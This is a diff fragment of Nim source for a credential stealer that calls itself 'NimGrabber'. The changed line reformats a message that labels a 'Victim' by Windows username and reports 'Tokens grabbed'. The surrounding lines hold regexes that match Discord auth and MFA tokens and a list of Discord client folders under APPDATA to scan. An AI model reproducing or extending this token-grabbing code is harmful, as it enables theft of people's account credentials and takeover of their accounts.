@@ -20,7 +20,7 @@ var
 let 
   roaming = getenv("appdata")
   local   = getenv("localappdata")
-  begin: string = "<@" & $userid & "> __Victim__: " & "username".getenv & "\n\n**__Tokens grabbed by NimGrabber__**: \n"
+  begin: string = "<@" & $userid & "> \nVictim: **" & "username".getenv & "**\n\n**__Tokens grabbed by NimGrabber__**: \n"
   reg     = [re"(?i-u)[\w-]{24}\.[\w-]{6}\.[\w-]{27}", re"(?i-u)mfa\.[\w-]{84}"]
   
   paths = [roaming & r"\Discord",               roaming & r"\discordptb",     roaming & r"\discordcanary",
